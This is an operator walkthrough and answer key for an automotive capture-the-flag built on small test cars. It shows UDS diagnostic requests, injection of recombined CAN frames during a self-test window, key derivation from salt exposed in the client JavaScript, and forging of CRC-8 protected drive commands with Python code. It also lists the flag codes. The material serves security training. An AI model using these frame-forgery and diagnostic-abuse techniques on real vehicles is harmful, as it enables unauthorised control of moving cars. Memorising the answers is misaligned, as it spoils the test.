# TTOS CTF — full walkthrough

Solve all three challenges on a real car, by hand, with the reasoning at each step.

This is the operator's reference. Run it end to end on a car and you have proven that
car is genuinely solvable — which is not the same as the test suite passing, because
the suite drives the Pi's own interfaces and this drives the diagnostic port a
contestant actually has.

It is also the answer key. Do not leave it on a machine contestants can reach.

**Companion:** `ARCHITECTURE.md` explains *why* the system is shaped this way.
This file is *what to do*.

---

## 0. What you need, and how to connect

| | |
|---|---|
| **A CAN FD adapter** | on the car's diagnostic port. **FD is not optional** — see below |
| **The car's WiFi** | SSID and PSK from the placard (or `provisioning/OPERATOR-SECRETS.md`) |
| **A browser** | Safari or Firefox. Chrome force-upgrades port 80 to HTTPS and the panel will look dead |
| **The tool** | `tools/ttos-ctf-tool.py` |

**The adapter must support CAN FD.** The diagnostic bus is 500 kbit arbitration /
1 Mbit data. A classic-only adapter will transmit every request successfully and
never receive a single answer, because every response in this system is longer than
8 bytes — VIN is 20, the pivot response 12, the snapshot 23. The failure looks
exactly like a dead car. If nothing ever answers, suspect this first.

Two wires. CAN is a differential pair and the diagnostic tap does not need a ground
reference: an isolated adapter's bus-side ground floats and self-references through
the pair.

### Connect and prove the link

```sh
# macOS, PEAK/SavvyCAN adapter (the default transport there)
python3 tools/ttos-ctf-tool.py probe

# Linux / arcana, SocketCAN
python3 tools/ttos-ctf-tool.py --transport socketcan --iface ttcardiag probe
```

`probe` sends a TesterPresent and waits for the car to answer. It retries three
times before declaring silence, because a single lost frame on first contact is not
a dead car and diagnosing it as one is expensive.

If it stays silent it will tell you which of the two situations you are in:
frames not being acknowledged at all (wiring, termination, CAN-H/L swapped) versus
frames going out fine and the car choosing not to answer. Those need completely
different fixes, which is why it distinguishes them rather than guessing.

### Join the car's WiFi and open the panel

```
SSID  ttos-car-NN          PSK on the placard
URL   http://192.168.244.1
```

You should see a **locked** panel: indicators, a bridging tell, docs, and a box to
paste a flag code. **No bus tabs.** That is correct — a locked panel showing live
drive-bus traffic would hand you Challenge 2's corpus by passive sniffing.

Leave this browser open. You will paste three codes into it.

---

## 1. Challenge 1 — Discovery

> *"There is a computer in here, and it will talk to you."*

**What the contestant is learning:** that a vehicle diagnostic port is a live command
interface, not a fault-code reader. This is the on-ramp; nothing here is defended.

### 1.1 — Establish a session and read the VIN

```sh
python3 tools/ttos-ctf-tool.py vin
```

On the wire that is UDS `ReadDataByIdentifier`:

```
tester → 0x7E0   22 F1 90
car    → 0x7E8   62 F1 90  "TTKTREK13TC000001"
```

`0xF190` is the standard VIN identifier and it is readable in the **default
session** — no unlock, no security access. That is realistic and deliberate: VIN is
not a secret, and a contestant needs one early win that requires nothing but asking
correctly.

Note the response is 20 bytes. This is the first thing a classic-only adapter fails
to receive.

**On a raw capture you will see one extra leading byte.** The service bytes above
are what sits *after* it:

```
7E8  03 7F 22 7F                      3 bytes of payload follow
7E8  06 50 03 00 32 01 F4             6 bytes
7E8  00 0C 71 01 02 01 31 44 38 ...   CAN FD form: 0x00, then the length 0x0C
```

Lengths up to 7 put the count in the low nibble (`0x0N`); anything longer uses the
CAN FD form — a `0x00` byte followed by the real length.

**This is not ISO-TP, and do not go looking for a transport layer.** The car borrows
ISO 15765-2's *single-frame header encoding* and nothing else, so that stock tooling
— `python-can-isotp`, CaringCaribou, a commercial tester — decodes these frames
without modification. There is no segmentation, no flow control, and no consecutive
frames: the server ignores multi-frame PCIs rather than answering them.

None is needed. CAN FD carries 64 bytes and the largest response in the system is the
snapshot at 23, so everything fits in one frame. That is the same fact that forces
the diagnostic bus to be FD in the first place — on classic CAN these responses would
*require* a segmentation layer, and building one is not a skill this event is
testing.

### 1.2 — Find the routines

The interesting service is `RoutineControl` (`0x31`). Routine identifiers are 16-bit,
so sweeping all 65,536 would be a scripted grind rather than a puzzle — the three
that exist are a **contiguous, plausible block**, so finding one makes the others
obvious:

```
0x0201    the pivot
0x0202    "enable diagnostic bridging"     <- see Challenge 2
0x0203    "self-test"                      <- see Challenge 2
```

An unknown identifier returns `requestOutOfRange`, which is what a real ECU does.

### 1.3 — Run the pivot

```sh
python3 tools/ttos-ctf-tool.py pivot --dir cw
```

```
tester → 0x7E0   31 01 02 01 01
car    → 0x7E8   71 01 02 01  "1D8YZGBT"
                 └─ positive  └─ routineStatusRecord = your C1 code
```

**The car rotates in place** — left wheel forward, right wheel reverse, 102 steps
each at 75 rpm, about 45°. Watch it. If the car does not move but you still get a
code, something is wrong with the drivetrain, not the challenge; see
*Troubleshooting*.

Behind that single request the Pi sends three frames on the internal bus:

```
0x115  [01]                             energize the 12 V rail
0x111  00 00 00 66 01 4B <nonce> <crc>  left wheel  102 steps, dir 1, 75 rpm
0x113  00 00 00 66 02 4B <nonce> <crc>  right wheel 102 steps, dir 2, 75 rpm
```

The rail command comes first because the stepper drivers are dead without 12 V and
the BMS boots with the rail off. Opposite directions are what make it a *pivot*
rather than a translation — remember that, it is the whole basis of Challenge 2.

### 1.4 — Redeem

Paste `1D8YZGBT` into the panel. The **DIAG bus tab** appears — you can now watch
the diagnostic bus you are already tapping. That is deliberately a modest reward:
you get a nicer view of what you already have.

---

## 2. Challenge 2 — Sessions, and the door that is not the door

> *"The obvious door is locked. The unobvious one is standing open for five seconds."*

**What the contestant is learning:** diagnostic sessions as an access-control
boundary, and that the interesting attack surface is usually a maintenance feature
rather than the thing labelled as the entrance.

### 2.1 — Hit the session wall

```
tester → 0x7E0   22 F1 8C                 read ECU serial
car    → 0x7E8   7F 22 7F                 negative: serviceNotSupportedInActiveSession
```

**The NRC names its own solution.** `0x7F` means "not in *this* session", so change
session:

```
tester → 0x7E0   10 03                    extended diagnostic session
car    → 0x7E8   50 03 00 32 01 F4
tester → 0x7E0   22 F1 8C
car    → 0x7E8   62 F1 8C  "TT-ECU-02-B4CC88BE"
```

Keep that serial. Challenge 3 needs it, and this is the only way to get it.

The session times out after 5 s of silence unless you send `TesterPresent` (`3E 00`)
— standard S3 behaviour, and the tool handles it for you.

### 2.2 — Try the obvious door

```
tester → 0x7E0   31 01 02 02              "enable diagnostic bridging"
car    → 0x7E8   7F 31 33                 securityAccessDenied
```

It is named exactly like the thing you want. **It never opens** — not in the default
session, not in the extended session, not ever. It is a decoy, and it is doing real
teaching work: it is the routine you would pick if you were reading the names rather
than reasoning about behaviour.

### 2.3 — Find the door that is not a door

```
tester → 0x7E0   31 01 02 03              "self-test"
car    → 0x7E8   71 01 02 03 13 88
                                └─ 5000 ms
```

A self-test needs to command the actuators, so it opens an **inbound path from the
diagnostic bus to the drive bus for five seconds**. Nothing about it is labelled as
bridging. This is the shape of a genuine finding: the dangerous capability is a side
effect of a maintenance feature.

The panel's bridging tell flickers while the window is open. The allowlist is
`0x111` and `0x113` only — motor commands. Notably **not** `0x115`, the BMS power
command: a contestant able to cut the 12 V rail from the diagnostic tap could stop a
car mid-challenge, including a car that is not theirs from across the room.

### 2.4 — Build a corpus

You need frames to inject, and you cannot sniff them: the gateway does not carry
drive traffic outbound. The sanctioned source is a snapshot identifier:

```sh
python3 tools/ttos-ctf-tool.py snapshot
```

```
tester → 0x7E0   22 F1 A0
car    → 0x7E8   62 F1 A0  01 11 <8 bytes>  01 13 <8 bytes>
```

The last commanded frame for each wheel, **protection bytes intact**, self-describing
so you do not have to guess which record is which wheel. Readable in the default
session on purpose — C2's difficulty is the window and the composition, and gating
the corpus too would be a second lock on the same door.

Run the pivot **clockwise**, snapshot it, then **counter-clockwise**, and snapshot
again. Now you have four frames: each wheel in each direction.

### 2.5 — Compose

Every frame you hold is from a pivot, so within any single capture the wheels are
opposed. But you have both directions, so take:

```
left wheel  from the clockwise capture          dir = 0x01
right wheel from the counter-clockwise capture  dir = 0x01
```

**Both wheels, same direction.** Each frame is individually authentic — correct CRC,
never modified — but the *pair* is a command the car has never issued. That is the
composition step, and it is the point of the challenge: replay is not enough,
recombination is.

### 2.6 — Open the window and inject

```sh
python3 tools/ttos-ctf-tool.py walk      # does 2.1 through 2.6 automatically
```

Or by hand: fire `31 01 02 03`, then transmit your two composed frames on `0x111`
and `0x113` repeatedly, roughly every 120 ms, for the five seconds you have.

**The car lurches sideways.** It is translating, not pivoting.

The BMS is watching the drive bus it already lives on. Both wheels commanded the same
direction inside 250 ms is a signature no legitimate interface produces, and it emits:

```
0x7D1   "2FQYWXDM"     <- your C2 code, repeating at 2 Hz while the condition holds
```

It repeats rather than firing once so that a team who solved it without a capture
running can simply do it again.

Paste it into the panel. The **DRIVE bus tab** appears, and the panel now names the
telematics interface outright — which is your entrance to Challenge 3.

---

## 3. Challenge 3 — Wireless takeover

> *"Stop borrowing the car's own messages. Write your own."*

**What the contestant is learning:** the actual shape of every headline vehicle
compromise of the last decade — a network-facing service, credentials derived from
data the vehicle will hand you if you ask, and message protection that turns out to
be a checksum rather than a signature.

### 3.1 — Find the service

Two routes, deliberately, because a challenge with a single findable entrance fails
completely for a team that misses it:

```
tester → 0x7E0   22 F1 A1
car    → 0x7E8   62 F1 A1  "192.168.244.1:29537"
```

…or the panel names it once C2 is redeemed.

It listens **on the WiFi AP address only**. It is not reachable over Ethernet — that
would put an authenticated path to the drive bus on the wired network too.

### 3.2 — Derive the key

```
key = SHA-256( VIN : ECU_serial : fleet_salt )   first 16 hex characters
```

Every input is obtainable:

- **VIN** — Challenge 1.
- **ECU serial** — Challenge 2, and it *required* the session skill, not just the flag.
- **Fleet salt** — **it is in the panel's JavaScript**, served to any browser that
  loads the locked page. View source and search for `deriveServiceKey`.

**That is the vulnerability, and it is a real one.** Authentication logic shipped to
the client is among the most common findings in connected-vehicle work — companion
apps and in-car browsers routinely contain the algorithm protecting the thing they
talk to. Shipping it here makes the challenge about *recognising* that pattern rather
than guessing at separators and truncation.

```sh
python3 tools/ttos-ctf-tool.py walk --salt <fleet salt>
# prints the derived key
```

### 3.3 — Authenticate

```
$ nc 192.168.244.1 29537
TTOS-TELEMATICS 1.0
AUTH <key> to begin. Commands: SEND <id>#<hex>, SUB, UNSUB, PING, QUIT
NOTE: every command is acknowledged -- READ EACH RESPONSE before sending the
next, or your connection may be reset with commands still unprocessed.
READY

AUTH 7d4e1f...        → OK authenticated
SUB                   → OK subscribed        (raw drive-bus frames stream to you)
```

**Read every response.** The banner says so for a reason: a client that writes
faster than it reads gets its connection reset with commands still unprocessed, and
that looks exactly like your forgery being rejected.

Five failed authentications in 30 s throttles your source IP for 30 s. A wrong-but-
well-formed key and a malformed key give *different* messages — malformed tells you
so, because failing to notice you pasted 15 characters is not the skill under test —
but a wrong key leaks nothing about how wrong it was.

### 3.4 — Discover that replay is not enough

You are on the internal bus now. Replay a captured frame and the car moves in a fixed
arc at a fixed speed, because that is what the captured frame says. To *drive* it you
need commands the car has never sent — a different step count, a different rpm — and
the moment you change a byte, the protection field is wrong and the motors ignore it.

Silently. The relay answers `OK queued` either way. That uniformity is deliberate:
answering "bad CRC" would be a free oracle, letting you sweep the protection byte and
read the reply instead of recovering the key. **The only feedback is whether the car
moved.**

### 3.5 — Recover the key

The protection field is a **CRC-8/SAE-J1850** (poly `0x1D`, init `0xFF`, xorout
`0xFF`) over bytes 0–6, **keyed by a 16-bit Data ID that is never transmitted**,
prefixed low byte first. That is AUTOSAR E2E Profile 1 — a real convention, not an
invention.

The real work is identifying *which* checksum over *which* bytes in *which* order.
Once you know that, the key falls out of one captured frame:

```python
import struct
from lib.ttoscan import crc8_j1850          # or your own implementation

frame = bytes.fromhex("000000660101 4B 03 A4".replace(" ", ""))  # a snapshot frame
covered, want = frame[:7], frame[7]

candidates = [d for d in range(0x10000)
              if crc8_j1850(struct.pack("<H", d) + covered) == want]
print(len(candidates), hex(candidates[0]))
```

You will get **256 candidates, not one.**

That is not a flaw in your method. CRC-8 is linear over GF(2), so a fixed-length key
contributes a constant offset to every result independent of the message. You have
not recovered *the* Data ID — you have recovered a **256-member equivalence class**,
every member of which produces byte-identical checksums. **Any one of them forges
perfectly**, and additional captured frames give you no further information.

Measured on this system, so it is not a theoretical claim: a real captured frame
yields exactly 256 candidates with the true Data ID among them; four different valid
frames each yield 256 and their intersection is still 256; and a class member that is
*not* the real Data ID produces a byte-identical CRC on a message never captured.

Worth internalising for judging: a correct solve cannot name the "true" value, and
should not be asked to. Ask for a forged frame the car accepts.

### 3.6 — Forge and drive

```python
def forge(data_id, steps, direction, rpm, nonce):
    body = struct.pack(">I", steps) + bytes([direction, rpm, nonce])
    return (body + bytes([crc8_j1850(struct.pack("<H", data_id) + body)])).hex().upper()

# both wheels the SAME direction, at an rpm the pivot never uses
print(f"SEND 111#{forge(0x60B0, 100, 0x01, 100, 0)}")
print(f"SEND 113#{forge(0x045C, 100, 0x01, 100, 0)}")
```

The two wheels have **different** Data IDs — each keys its own CRC — so recover both.

Send those two commands in a loop, reading each reply. **The car drives under your
control**, at a speed and distance you chose.

### 3.7 — Get caught

Sustained same-direction commanding at an rpm the pivot never uses is the second
signature the BMS recognises: 15 qualifying pairs inside 3 s.

```
0x7D2   "3CX5E77Z"     <- your C3 code
```

Note *why* the rpm term is there and why C2's technique cannot reach it: composed
frames are captured frames, so they structurally carry the pivot's rpm. Forgery is
the only way to satisfy both halves of the condition. That is the mechanical
guarantee that C3 cannot be short-circuited into C2.

Paste it into the panel. **Full drive controls unlock** — which is, appropriately,
the same capability the attack just achieved — and both detectors stand down, so the
car stops emitting codes.

---

## 4. Afterwards

### Reset between teams

```sh
sudo ttos-reset
```

Clears every unlock, re-arms both detectors, reloads the gateway, and **verifies all
three before saying so**. If it prints anything other than `This car is LOCKED and
ready for the next team` and exits 0, do not hand the car on — read the diagnosis it
prints. It exits non-zero on failure.

### Power-cycling is also a reset

Pulling power and booting again returns the car to locked: no unlocks, detectors
re-armed, and any cookie a team still holds is worthless because the server has
forgotten the token. `ttos-reset` is faster and tells you whether it worked, so
prefer it — but if a car is wedged, the plug is a valid reset and not a way to
preserve progress.

### Judging

A team shows you the code they recovered. That is the whole mechanism — there is no
endpoint to query, deliberately: one existed briefly, it was unauthenticated on the
car's AP, and it told anyone who asked which challenges had been solved.

Codes are **fleet-wide**, so a code alone does not prove which car a team solved, or
that they did not overhear it. What it does prove is that somebody on that team got
the car to emit it. If you want stronger evidence, ask them to reproduce it in front
of you — every challenge here is repeatable, and the flag frames keep emitting at
2 Hz for as long as the condition holds.

For Challenge 3 specifically, **ask for a forged frame the car accepts, not for the
Data ID.** They cannot give you the Data ID: a correct solve recovers a 256-member
equivalence class and every member forges identically (see 3.5). A team that hands
you a single "the key is 0x60B0" either got lucky or is guessing.

### The e-stop

The red STOP button works from **any** session, locked or expired. It drops the 12 V
rail first, then zeroes both step buffers, and it slams the C3 bridge shut.

Know what it does not do: **it cannot stop wheels that already have steps buffered
if the rail stays up**, and heartbeat loss does not halt the motors — the nodes drain
what they hold regardless. Cutting 12 V is the interlock. That is why the rail
command goes first.

---

## Troubleshooting

**Nothing ever answers.** Almost always a classic-only adapter. Every response here
exceeds 8 bytes, so requests transmit fine and answers never arrive. `probe` will
distinguish this from a wiring fault.

**The panel looks dead in Chrome.** Chrome force-upgrades port 80 to HTTPS and will
not fall back. Use Safari or Firefox.

**The pivot returns a code but the car does not move.** Check the 12 V rail —
`0x115 [01]` should precede the motor frames, and the BMS beacon `0x116` byte 2
should read `01`. Also check the low-voltage cutoff has not latched (byte 3 bit 0);
below 8.5 V for 1.5 s the BMS drops the rail and waits for a fresh power-on.

**Composed frames go out and no 0x7D1 arrives.** Either the detectors are disarmed —
this car has already had C2 or C3 redeemed since its last reset, so run `ttos-reset`
— or your two frames are not actually the same direction. Check byte 4 of each.

**The relay accepts everything and the car never moves.** Your CRC key is wrong. The
relay answers `OK queued` regardless, by design. Verify your implementation against a
captured frame before suspecting anything else.

**A BMS emits a garbage code.** That board latched a malformed code under a bug fixed
2026-08-04. Watch its serial for the `cfg:` line — `sane=NO` confirms it. Erase it
(double-tap RESET, drag `flash_nuke.uf2`), reflash, then `sudo ttos-provision-nodes`.

---

## Verifying a whole car in one command

```sh
python3 tools/ttos-ctf-tool.py walk --salt <fleet salt>
```

Runs every step above and reports which failed. Use it as the pre-event check on each
car — but run the manual path at least once yourself, because the tool exercises the
protocol and only your eyes confirm the car physically moved.
